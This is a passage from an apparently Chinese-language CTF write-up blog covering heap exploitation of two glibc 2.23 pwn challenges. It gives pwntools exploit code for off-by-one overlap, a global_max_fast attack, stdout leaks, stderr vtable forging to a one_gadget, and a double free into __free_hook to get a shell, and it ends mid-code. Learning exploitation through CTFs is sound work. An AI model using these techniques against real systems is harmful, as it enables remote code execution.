<span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token string">'\x00'</span> <span class="token operator">+</span> <span class="token string">'\n'</span>    edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> py<span class="token punctuation">)</span>    rc<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3c5600</span>    onegadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xf1147</span>    <span class="token keyword">print</span> <span class="token string">"libc_base--->"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>    fake_vtable <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3c5600</span><span class="token operator">-</span><span class="token number">8</span>    binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>    py <span class="token operator">=</span> <span class="token string">'\x00'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x3c55e0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">+</span> \        p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_vtable<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>    edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> py<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># trigger abort-->flush</span>    malloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> i    i <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        local <span class="token operator">=</span> <span class="token number">1</span>        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./note_five'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> local<span class="token punctuation">:</span>            p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./note_five'</span><span class="token punctuation">)</span>            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23_x64.so'</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'121.40.246.48'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        sl<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>程序保护全开，菜单题，拖进IDA分析一下<br>main函数<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/10.jpg" alt=""><br>add函数<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/11.jpg" alt=""><br>允许分配的chunk大于fastbin<br>edit函数<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/13.jpg" alt=""><br>其中的sub_A70的函数存在off-by-one漏洞<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/12.jpg" alt=""><br>最后是delete函数<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/14.jpg" alt=""><br>free并且清零，无漏洞<br>我们的攻击思路如下</p><blockquote><p>1.利用offbyone实现overlap<br>2.利用overlap实现改BK指针，攻击global_max_fast<br>3.改FD指针为stdout-0x51，成功实现劫持<br>4.改结构体从而泄露真实地址<br>5.然后伪造stderr的vtable，由于程序报错会执行vtable+0x18处的IO_file_overflow函数，所以将这个IO_file_overflow函数改成onegadget<br>6.malloc很大的块，最后触发IO_file_overflow中的_IO_flush_all_lockp，从而getshell</p></blockquote><p>首先通过off-by-one触发后向合并</p><pre class=" language-python"><code class="language-python">malloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'c'</span> <span class="token operator">*</span> <span class="token number">0xe0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x2f0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x00'</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span></code></pre><p>初始状态<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/15.jpg" alt=""><br>free(0)之后<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/16.jpg" alt=""><br>off-by-one之后<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/17.jpg" alt=""><br>free(3)之后，导致后向合并<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/18.jpg" alt=""><br>接下来将堆块构造成初始状态</p><pre class=" language-python"><code class="language-python">malloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x2f0</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'\x22'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/19.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/20.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/21.jpg" alt=""><br>然后free掉chunk1，使main_arena放到chunk1的fd和bk指针上，这样我们就可以通过edit0来修改globa_max_fast了</p><pre class=" language-python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>global_max_fast <span class="token operator">=</span> <span class="token number">0x77f8</span>stdout <span class="token operator">=</span> <span class="token number">0x77f8</span> <span class="token operator">-</span> <span class="token number">0x1229</span>payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">0x77f8</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p>这里面的<code>0x77f8</code>是global_max_fast地址的最后四位，虽然开启了PIE，但地址的最后三位是不变的，我们只需要爆破倒数第四位即可，也就是十六分之一的几率，我们可以在gdb中看看<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/22.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/23.jpg" alt=""><br>global_max_fast与main_arena的地址相比确实只有最后四位不一样，并且最后三位固定为<code>7f8</code><br>而<code>0x1229</code>则是global_max_fast的地址与stdout上可以构造fakechunk的地址的相对便宜<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/24.jpg" alt=""></p><pre class=" language-python"><code class="language-python">malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'\x22'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p>两次malloc之后，global_max_fast的值变成了main_arena+88的地址(十六分之一的几率)<br>接着再将堆块恢复</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'\x22'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p>然后开始准备修改IO_FILE，泄露libc地址</p><pre class=" language-python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'\x22'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p16<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p>此时的堆结构如下<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/25.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/26.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/27.jpg" alt=""></p><pre class=" language-python"><code class="language-python">malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">)</span>py <span class="token operator">=</span> <span class="token string">''</span>py <span class="token operator">+=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x41</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token string">'\x00'</span> <span class="token operator">+</span> <span class="token string">'\n'</span> edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>py<span class="token punctuation">)</span></code></pre><p>第一次malloc之后<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/28.jpg" alt=""><br>接下来再malloc一次就能将chunk分配到stdout-0x51处<br>然后修改IO_FILE的值，就能泄露出libc地址了<br>剩下的也就比较容易了，再次修改IO_FILE</p><blockquote><p>然后伪造stderr的vtable，由于程序报错会执行vtable+0x18处的IO_file_overflow函数，所以将这个IO_file_overflow函数改成onegadget</p></blockquote><p>附上vtable存储的函数跳转指针</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span> funcs<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>   <span class="token number">1</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// "extra word"</span>   <span class="token number">2</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// DUMMY</span>   <span class="token number">3</span> exit<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// finish</span>   <span class="token number">4</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// overflow</span>   <span class="token number">5</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// underflow</span>   <span class="token number">6</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// uflow</span>   <span class="token number">7</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// pbackfail</span>   <span class="token number">8</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// xsputn  #printf</span>   <span class="token number">9</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// xsgetn</span>   <span class="token number">10</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// seekoff</span>   <span class="token number">11</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// seekpos</span>   <span class="token number">12</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// setbuf</span>   <span class="token number">13</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// sync</span>   <span class="token number">14</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// doallocate</span>   <span class="token number">15</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// read</span>   <span class="token number">16</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// write</span>   <span class="token number">17</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// seek</span>   <span class="token number">18</span> pwn<span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// close</span>   <span class="token number">19</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// stat</span>   <span class="token number">20</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// showmanyc</span>   <span class="token number">21</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// imbue</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><pre class=" language-python"><code class="language-python">rc<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3c5600</span>onegadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xf1147</span><span class="token keyword">print</span> <span class="token string">"libc_base--->"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>fake_vtable <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3c5600</span><span class="token operator">-</span><span class="token number">8</span> binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>py <span class="token operator">=</span> <span class="token string">'\x00'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x3c55e0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_vtable<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>py<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># trigger abort-->flush</span>malloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span></code></pre><p>看一看edit后的效果<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/29.jpg" alt=""><br>这样看不太清楚，我们以8字节对齐来看<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/30.jpg" alt=""><br>再看一下stderr的vtable的指针<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/31.jpg" alt=""><br>确实被修改了(这种攻击方式只对libc2.24以下有效，2.24及以上就有了防御手段了，不过一样有方法攻击)<br>one_gadget的地址被放在了vtable+0x18的位置处，只需要使其报错即可getshell</p><h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><p>考察点：off-by-one free_hook<br>程序保护全开，有增删查三个功能<br>main函数中有一个sub_BD8函数</p><pre class=" language-c"><code class="language-c">v0 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>qword_202040 <span class="token operator">=</span> _malloc_hook<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v0<span class="token punctuation">;</span></code></pre><p>将__malloc_hook赋给了qword_202040<br>还有一个sub_AFA函数</p><pre class=" language-c"><code class="language-c">v1 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>dword_202048 <span class="token punctuation">)</span>  <span class="token function">_assert_fail</span><span class="token punctuation">(</span><span class="token string">"replaced"</span><span class="token punctuation">,</span> <span class="token string">"fastbin.c"</span><span class="token punctuation">,</span> <span class="token number">0x26u</span><span class="token punctuation">,</span> <span class="token string">"restore_hook"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dword_202048 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>_malloc_hook <span class="token operator">=</span> qword_202040<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v1<span class="token punctuation">;</span></code></pre><p>就是说malloc_hook的值在每次add之后都会被修改，这样我们就无法利用__malloc_hook了</p><p>再看到add函数<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/32.jpg" alt=""><br>存在off-by-one漏洞</p><p>然后是delete函数<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/33.jpg" alt=""><br>free且清零，无漏洞</p><p>最后是show函数<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/34.jpg" alt=""><br>输出所有chunk的内容</p><p>整理一下攻击思路：无法修改got表，无法利用malloc_hook，剩下的可以利用和free_hook和IO_FILE，个人倾向于使用free_hook<del>(IO_FILE使用不熟练,tcl)</del><br>那么先来泄露libc地址<br>这题的泄露方法很简单，add一个unsorted bin大小的chunk，然后free，接着add相同大小的chunk，接着输出即可</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">'leak_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> leak_addr<span class="token number">-0x3c4b78</span>success<span class="token punctuation">(</span><span class="token string">'libc_base:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>__malloc_hook_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'__malloc_hook_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>__malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>__free_hook_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'__free_hook_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>__free_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'system_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>另外，off-by-one可以构造出doublefree，构造方法如下</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 3</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 4</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># delete 2 and 3</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 5</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># free chunk3</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># double free chunk3</span></code></pre><p><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/35.jpg" alt=""><br>构造出了double free<br>接下来就是想办法把chunk分配到free_hook上方，然后将system函数的地址写入其中，最后free一个内容是/bin/sh的chunk即可getshell<br>由于free_hook的上方都是0，所以我们无法利用fastbinattack<br>于是我们把topchunk的地址挪一挪，使其挪到一个我们经过一定次数分配后能将chunk分配到free_hook的地方<br>首先让我们康康<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/37.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/38.jpg" alt=""><br>topchunk的地址正是存在main_arena+88处，所以我们想办法修改main_arena+88的值即可，那我们该如何修改修改<br>可以在main_arena附近使用fastbin attack<br>我们可以找到在__malloc_hook-0x3处存在一个大小合适的chunk<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/36.jpg" alt=""><br>而malloc_hook又是紧邻main_arena的，所以可以从这里开始<br>我们先利用double free将chunk分配到malloc_hook-0x3处</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token number">-0x3</span><span class="token 